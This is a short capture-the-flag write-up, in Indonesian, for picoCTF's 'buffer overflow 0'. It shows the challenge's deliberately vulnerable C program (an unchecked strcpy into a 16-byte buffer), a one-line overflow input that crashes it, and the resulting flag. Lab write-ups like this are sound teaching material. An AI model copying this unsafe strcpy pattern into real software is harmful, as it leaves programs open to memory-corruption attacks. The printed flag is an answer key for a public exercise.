<h1><b>buffer overflow 0</h1></b>
<pre>
Let's start off simple, can you overflow the right buffer in this <a href='https://2018shell.picoctf.com/static/3149816cf3615fa68f99af3cd667d6b9/vuln'>program</a> to get the flag? 
You can also find it in /problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631 on the shell server. <a href='https://2018shell.picoctf.com/static/3149816cf3615fa68f99af3cd667d6b9/vuln.c'>Source</a>.
</pre>
</b><h3>Solution</h3></b>
<p>Jika dilihat dari sourcenya, sebagai berikut</p>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}
```
<p>Kelemahannya yaitu overflow, ketika kita menginput suatu string yang panjangnya lebih dari yang diminta program yaitu 16 bytes, maka file flag.txt akan otomatis ter-eksekusi dan mendapatkan flagnya walaupun kondisi permision denied</p>

```console
root@Python:/home/venom/Downloads# ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}

root@Python:/home/venom/Downloads# 
```
</b><h3>Flag</h3></b>
<pre>
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
</pre>
